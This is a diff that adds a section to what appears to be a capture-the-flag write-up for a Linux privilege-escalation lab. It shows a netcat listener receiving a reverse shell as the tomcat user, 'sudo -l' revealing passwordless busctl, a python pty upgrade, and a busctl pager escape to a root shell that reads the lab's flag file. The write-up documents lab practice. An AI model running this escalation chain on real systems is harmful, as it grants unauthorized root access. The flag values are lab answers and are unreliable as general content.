@@ -297,4 +297,34 @@ LLPE{im_th3_m@nag3r_n0w}
 ```
 
 
+#### Flag 5
+```python
+$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.129.85.233] 43346
+
+sudo -l
+Matching Defaults entries for tomcat on nix03:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tomcat may run the following commands on nix03:
+    (root) NOPASSWD: /usr/bin/busctl
+```
+
+[source](https://infosecwriteups.com/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2)
+
+The user can execute busctl as root without a password.  I need to break out of the limited shell
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+tomcat@nix03:/var/lib/tomcat9$ sudo busctl --show-machine
+sudo busctl --show-machine
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/bash
+!//bbiinn//bbaasshh!/bin/bash
+root@nix03:/var/lib/tomcat9# cat /root/flag5.txt
+cat /root/flag5.txt
+LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
+```
+
 
